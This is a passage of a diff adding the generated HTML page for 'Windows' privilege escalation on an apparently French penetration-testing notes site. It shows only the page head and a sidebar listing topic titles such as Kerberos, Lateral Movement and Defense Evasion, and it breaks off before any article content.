@@ -1,0 +1,6300 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://jsdlm.github.io/docs/PrivilegeEscalation/Windows.html">
+      
+      
+        <link rel="prev" href="Linux.html">
+      
+      
+        <link rel="next" href="../RedTeam/AdaptixC2.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Windows - Documentation</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#windows" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="Documentation" class="md-header__button md-logo" aria-label="Documentation" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Documentation
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="Documentation" class="md-nav__button md-logo" aria-label="Documentation" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Documentation
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Table of Content
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hello.cpp.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hello.cpp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ActiveDirectory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ActiveDirectory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/ACL.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/ADCS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ADCS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Coerce.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coerce
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Credential%20Access.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/DNS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Domain%20Dominance.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Dominance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/D%C3%A9l%C3%A9gations%20Kerberos.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Délégations Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Enum%C3%A9ration%20LDAP.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumération LDAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Forest%20%26%20Domain%20Trusts.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forest &amp; Domain Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/GPO.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GPO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Kerberos.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Lateral%20Movement.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/MSSQL.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/NTLM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Password%20Spraying.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Password Spraying
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Poison%20and%20Relay.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Poison and Relay
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Reconnaissance.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Ressources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/SamAccountName.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SamAccountName
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Shares.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shares
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/User%20Impersonation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User Impersonation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/_M%C3%A9thodologie.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    _Méthodologie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CRTL
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CRTL
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/1.%20C2%20Infrastructure.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. C2 Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/2.%20Load-Time%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Load-Time Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/3.%20Runtime%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Runtime Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/4.%20Post-Exploitation%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Post-Exploitation Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/5.%20Lateral%20Movement.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/6.%20Vulnerable%20Drivers.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Vulnerable Drivers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/7.%20App%20Control%E2%80%8C%E2%80%8C.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. App Control‌‌
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/8.%20Credential%20Guard.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Credential Guard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/Fiche%20R%C3%A9sum%C3%A9.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fiche Résumé
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/The%20Windows%20DLL%20Loader%20and%20the%20PE%20File%20Format.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Windows DLL Loader and the PE File Format
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CRTO
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CRTO
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/CheatSheet.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CheatSheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/Defense%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Defense Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/Initial%20access.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/Notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Database
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Database
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/MySQL-MariaDB.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MySQL-MariaDB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/mongodb.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    mongodb
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/mssql.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    mssql
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/oracle.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    oracle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/postgresql.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    postgresql
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/redis.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    redis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/snowflake.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    snowflake
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/sqlite.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    sqlite
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Developpement
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Developpement
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developpement/C%2B%2B.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C++
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developpement/Compilation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compilation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developpement/DLL%20Hijacking.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DLL Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exploits
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Exploits
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
